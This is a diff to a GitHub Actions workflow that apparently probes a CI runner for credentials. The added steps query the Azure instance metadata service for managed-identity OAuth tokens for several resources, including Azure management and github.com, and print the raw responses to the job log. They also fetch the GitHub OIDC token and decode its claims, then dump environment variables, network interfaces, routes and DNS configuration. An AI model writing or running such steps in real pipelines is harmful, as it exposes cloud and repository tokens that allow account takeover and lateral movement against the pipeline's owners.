@@ -9,41 +9,72 @@ jobs:
       id-token: write
       contents: read
     steps:
-      - name: Test Azure IMDS - instance
+      - name: Azure IMDS - Full instance with identities
         run: |
-          echo "=== Azure IMDS Instance ==="
-          curl -s -m 2 "http://169.254.169.254/metadata/instance?api-version=2021-02-01&format=json" -H "Metadata: true" 2>&1 || echo "FAILED: instance"
+          echo "=== FULL INSTANCE METADATA ==="
+          curl -s -m 2 "http://169.254.169.254/metadata/instance?api-version=2021-02-01&format=json" -H "Metadata: true"
+          echo ""
+          echo "=== IDENTITY SECTION ==="
+          # Check if there are user-assigned identities
+          curl -s -m 2 "http://169.254.169.254/metadata/instance/compute/azEnvironment?api-version=2021-02-01&format=text" -H "Metadata: true"
+          echo ""
           
-      - name: Test Azure IMDS - identity token
+      - name: Azure IMDS - Identity token for management.azure.com
         run: |
-          echo "=== Azure IMDS Identity/Token ==="
-          curl -s -m 2 "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" -H "Metadata: true" 2>&1 || echo "FAILED: identity"
+          echo "=== MSI TOKEN FOR AZURE MANAGEMENT ==="
+          RESPONSE=$(curl -s -m 5 "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" -H "Metadata: true")
+          echo "Response: $RESPONSE"
           
-      - name: Test AWS IMDS
+      - name: Azure IMDS - Identity token for hosted-compute-ro
         run: |
-          echo "=== AWS IMDSv1 ==="
-          curl -s -m 2 "http://169.254.169.254/latest/meta-data/" 2>&1 || echo "FAILED: aws"
-          echo "=== AWS IMDSv2 token ==="
-          TOKEN=$(curl -s -m 2 -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" 2>&1)
-          echo "Token response: $TOKEN"
+          echo "=== MSI TOKEN FOR hosted-compute-ro ==="
+          RESPONSE=$(curl -s -m 5 "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=api://hosted-compute-ro" -H "Metadata: true")
+          echo "Response: $RESPONSE"
           
-      - name: Test GCP IMDS
+      - name: Azure IMDS - Identity token for GitHub apps
         run: |
-          echo "=== GCP IMDS ==="
-          curl -s -m 2 "http://metadata.google.internal/computeMetadata/v1/instance/" -H "Metadata-Flavor: Google" 2>&1 || echo "FAILED: gcp"
+          echo "=== MSI TOKEN FOR githubapp.com ==="
+          RESPONSE=$(curl -s -m 5 "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://githubapp.com" -H "Metadata: true")
+          echo "Response1: $RESPONSE"
           
+          echo "=== MSI TOKEN FOR github.com ==="
+          RESPONSE2=$(curl -s -m 5 "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://github.com" -H "Metadata: true")
+          echo "Response2: $RESPONSE2"
+
       - name: GitHub OIDC token
+        env:
+          ACTIONS_ID_TOKEN_REQUEST_URL: ${{ env.ACTIONS_ID_TOKEN_REQUEST_URL }}
+          ACTIONS_ID_TOKEN_REQUEST_TOKEN: ${{ env.ACTIONS_ID_TOKEN_REQUEST_TOKEN }}
         run: |
-          echo "=== GitHub OIDC Token Request ==="
-          curl -s "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange"             -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN"             -H "Content-Type: application/json" 2>&1 | head -c 500 || echo "OIDC failed"
+          echo "=== GitHub OIDC Token ==="
+          echo "Token URL: $ACTIONS_ID_TOKEN_REQUEST_URL"
+          OIDC_RESPONSE=$(curl -s "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange"             -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN")
+          echo "OIDC Response: $OIDC_RESPONSE"
           
-      - name: Runner environment
+          # Decode the JWT claims
+          TOKEN=$(echo "$OIDC_RESPONSE" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('value',''))" 2>/dev/null)
+          if [ -n "$TOKEN" ]; then
+            echo "JWT Header: $(echo $TOKEN | cut -d. -f1 | base64 -d 2>/dev/null)"
+            echo "JWT Claims: $(echo $TOKEN | cut -d. -f2 | base64 -d 2>/dev/null | python3 -c "import sys,json; d=json.load(sys.stdin); print(json.dumps(d,indent=2))" 2>/dev/null)"
+          fi
+          
+      - name: Check runner secrets and env
         run: |
-          echo "=== Key Environment Variables ==="
-          env | grep -iE 'AZURE|ARM_|MSI|IDENTITY|CLIENT_ID|TENANT|SUBSCRIPTION' | head -20 || echo "No Azure env vars"
-          echo "=== Runner info ==="
-          cat /etc/hostname 2>/dev/null || echo "no hostname"
-          whoami
-          cat /proc/1/cgroup 2>/dev/null | head -5 || echo "no cgroup"
-          ip route 2>/dev/null | head -5 || echo "no routes"
-          curl -s -m 2 "http://169.254.169.254/" 2>&1 | head -20 || echo "169.254.169.254 unreachable"
+          echo "=== Runner environment (filtered) ==="
+          env | sort | grep -v "^ACTIONS_RUNTIME" | grep -v "SECRET" | head -50
+          
+          echo "=== AZURE-related env ==="
+          env | grep -i "azure\|arm_\|msi\|identity\|client_id\|tenant\|subscription\|storage_account" || echo "None found"
+          
+          echo "=== Hostname ==="
+          hostname
+          cat /etc/hostname
+          
+          echo "=== Network interfaces ==="
+          ip addr show | grep "inet " | head -10
+          
+          echo "=== Routes ==="
+          ip route | head -10
+          
+          echo "=== DNS ==="
+          cat /etc/resolv.conf
